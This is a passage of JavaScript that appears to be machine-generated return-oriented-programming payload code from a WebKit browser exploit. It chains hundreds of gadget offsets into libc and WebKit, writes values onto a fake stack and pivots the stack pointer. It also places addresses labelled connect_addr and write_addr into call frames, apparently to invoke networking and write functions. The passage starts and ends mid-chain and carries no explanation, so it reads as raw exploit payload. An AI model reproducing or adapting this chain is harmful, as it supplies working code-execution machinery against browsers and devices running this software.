db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+772328,); //pop rcx
//L2856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2858:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+183400, //L2861
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+183384, //L2860
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2860:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2861:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+183560, //L2864
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+183592, //L2866
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+183544, //L2863
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+183576, //L2865
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2863:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2864:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2865:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2866:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+183688, //L2868
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+183672, //L2867
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2867:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+183784, //L2870
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2869:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L2870:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+183888, //L2873
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+183872, //L2872
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2872:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+184048, //L2876
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+184080, //L2878
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+184032, //L2875
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+184064, //L2877
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2875:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2876:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2877:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2878:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+184192, //L2879
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+184224, //L2881
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+184208, //L2880
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2879:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2880:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2881:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+184368, //L2882
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+184400, //L2884
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+184384, //L2883
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2882:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2883:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2884:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+184504, //L2886
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+184520, //L2887
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2885:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+772328,); //pop rcx
//L2886:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2887:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+184584, //L2890
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+489696, //pop rsp
ropchain+184624, //L2889
//L2749:
libc_base+489696, //pop rsp
ropchain+184640, //L2824
//L2889:
libc_base+489696, //pop rsp
ropchain+178496, //L2734
//L2824:
libc_base+713278, //pop rsi
ropchain+184696, //L2893
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2892:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+772328,); //pop rcx
//L2893:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+184800, //L2896
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+184784, //L2895
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2895:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+184960, //L2899
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+184992, //L2901
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+184944, //L2898
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+184976, //L2900
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2898:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2899:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2901:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+185088, //L2903
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+185072, //L2902
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2902:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2903:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2905:
ropchain+185192, //L2904
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+191184, //L2906
//L2904:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+185280, //L2908
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2907:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2908:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+185400, //L2910
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+185416, //L2911
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2910:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2911:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+185536, //L2912
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+185520, //L2913
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2913:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2912:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+185624, //L2915
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+185608, //L2914
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2914:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2915:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+185728, //L2916
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+185744, //L2917
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2916:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+185864, //L2918
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+185848, //L2919
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2919:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2918:
db([0, 0]); // 0x0
//L2792:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
write_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+187192, //L2920
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2920:
db([0, 0]); // 0x0
//L2709:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
connect_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+188520, //L2921
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2921:
db([0, 0]); // 0x0
//L2644:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
